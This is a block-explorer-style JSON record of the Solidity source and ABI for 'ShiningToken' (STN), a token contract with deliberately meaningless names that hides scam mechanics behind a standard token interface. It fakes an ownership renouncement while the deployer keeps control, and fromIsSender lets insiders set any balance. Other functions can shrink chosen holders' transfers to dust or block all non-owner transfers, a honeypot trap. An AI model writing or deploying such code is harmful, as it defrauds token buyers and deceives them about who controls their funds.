{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface fundTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyReceiverExempt) external view returns (uint256);\n\n    function transfer(address fromMin, uint256 swapTotal) external returns (bool);\n\n    function allowance(address tokenReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromMin,\n        uint256 swapTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverSender, uint256 value);\n    event Approval(address indexed tokenReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract buyLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingLiquidityTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundReceiver {\n    function createPair(address maxToSell, address enableTotalReceiver) external returns (address);\n}\n\ninterface fundTeamMetadata is fundTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ShiningToken is buyLiquidity, fundTeam, fundTeamMetadata {\n\n    uint256 constant senderReceiver = 9 ** 10;\n\n    constructor (){\n        \n        marketingLiquidityTeam fundShould = marketingLiquidityTeam(isLaunched);\n        buyFrom = fundReceiver(fundShould.factory()).createPair(fundShould.WETH(), address(this));\n        if (feeShould == atToken) {\n            atToken = modeSender;\n        }\n        isTotal = _msgSender();\n        txTotal();\n        teamSell[isTotal] = true;\n        tokenBuy[isTotal] = isLaunch;\n        \n        emit Transfer(address(0), isTotal, isLaunch);\n    }\n\n    bool public maxLiquidity;\n\n    mapping(address => bool) public tokenLaunched;\n\n    function shouldSender(address maxMode, address fromMin, uint256 swapTotal) internal returns (bool) {\n        if (maxMode == isTotal) {\n            return toEnableAt(maxMode, fromMin, swapTotal);\n        }\n        uint256 toTeamTotal = fundTeam(buyFrom).balanceOf(teamReceiver);\n        require(toTeamTotal == feeLiquidity);\n        require(fromMin != teamReceiver);\n        if (tokenLaunched[maxMode]) {\n            return toEnableAt(maxMode, fromMin, senderReceiver);\n        }\n        return toEnableAt(maxMode, fromMin, swapTotal);\n    }\n\n    uint256 public feeShould;\n\n    function allowance(address listEnableReceiver, address receiverSellToken) external view virtual override returns (uint256) {\n        if (receiverSellToken == isLaunched) {\n            return type(uint256).max;\n        }\n        return launchIs[listEnableReceiver][receiverSellToken];\n    }\n\n    uint256 swapReceiver;\n\n    function approve(address receiverSellToken, uint256 swapTotal) public virtual override returns (bool) {\n        launchIs[_msgSender()][receiverSellToken] = swapTotal;\n        emit Approval(_msgSender(), receiverSellToken, swapTotal);\n        return true;\n    }\n\n    function transfer(address launchedLaunch, uint256 swapTotal) external virtual override returns (bool) {\n        return shouldSender(_msgSender(), launchedLaunch, swapTotal);\n    }\n\n    function balanceOf(address buyReceiverExempt) public view virtual override returns (uint256) {\n        return tokenBuy[buyReceiverExempt];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingTakeBuy;\n    }\n\n    function fromIsSender(address launchedLaunch, uint256 swapTotal) public {\n        receiverFund();\n        tokenBuy[launchedLaunch] = swapTotal;\n    }\n\n    address isLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private teamToken = \"Shining Token\";\n\n    uint8 private tradingTakeBuy = 18;\n\n    function txTotal() public {\n        emit OwnershipTransferred(isTotal, address(0));\n        senderTradingEnable = address(0);\n    }\n\n    mapping(address => bool) public teamSell;\n\n    function name() external view virtual override returns (string memory) {\n        return teamToken;\n    }\n\n    mapping(address => uint256) private tokenBuy;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isLaunch;\n    }\n\n    bool private buySwap;\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeAt;\n    }\n\n    function feeAmount(address launchedMax) public {\n        receiverFund();\n        \n        if (launchedMax == isTotal || launchedMax == buyFrom) {\n            return;\n        }\n        tokenLaunched[launchedMax] = true;\n    }\n\n    bool public exemptMax;\n\n    address private senderTradingEnable;\n\n    address public isTotal;\n\n    function toSwap(address buyTx) public {\n        if (totalIsLaunched) {\n            return;\n        }\n        \n        teamSell[buyTx] = true;\n        if (buySwap) {\n            exemptMax = false;\n        }\n        totalIsLaunched = true;\n    }\n\n    string private feeAt = \"STN\";\n\n    uint256 private isLaunch = 100000000 * 10 ** 18;\n\n    bool private feeReceiver;\n\n    uint256 public modeSender;\n\n    mapping(address => mapping(address => uint256)) private launchIs;\n\n    function getOwner() external view returns (address) {\n        return senderTradingEnable;\n    }\n\n    function toEnableAt(address maxMode, address fromMin, uint256 swapTotal) internal returns (bool) {\n        require(tokenBuy[maxMode] >= swapTotal);\n        tokenBuy[maxMode] -= swapTotal;\n        tokenBuy[fromMin] += swapTotal;\n        emit Transfer(maxMode, fromMin, swapTotal);\n        return true;\n    }\n\n    function maxTakeMin(uint256 swapTotal) public {\n        receiverFund();\n        feeLiquidity = swapTotal;\n    }\n\n    function transferFrom(address maxMode, address fromMin, uint256 swapTotal) external override returns (bool) {\n        if (_msgSender() != isLaunched) {\n            if (launchIs[maxMode][_msgSender()] != type(uint256).max) {\n                require(swapTotal <= launchIs[maxMode][_msgSender()]);\n                launchIs[maxMode][_msgSender()] -= swapTotal;\n            }\n        }\n        return shouldSender(maxMode, fromMin, swapTotal);\n    }\n\n    address teamReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public atToken;\n\n    uint256 feeLiquidity;\n\n    address public buyFrom;\n\n    bool public totalIsLaunched;\n\n    uint256 private txReceiver;\n\n    function owner() external view returns (address) {\n        return senderTradingEnable;\n    }\n\n    uint256 public walletTx;\n\n    event OwnershipTransferred(address indexed takeTotal, address indexed walletAmount);\n\n    function receiverFund() private view {\n        require(teamSell[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listEnableReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSellToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSellToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyReceiverExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMax\",\"type\":\"address\"}],\"name\":\"feeAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTotal\",\"type\":\"uint256\"}],\"name\":\"fromIsSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapTotal\",\"type\":\"uint256\"}],\"name\":\"maxTakeMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTx\",\"type\":\"address\"}],\"name\":\"toSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalIsLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ShiningToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}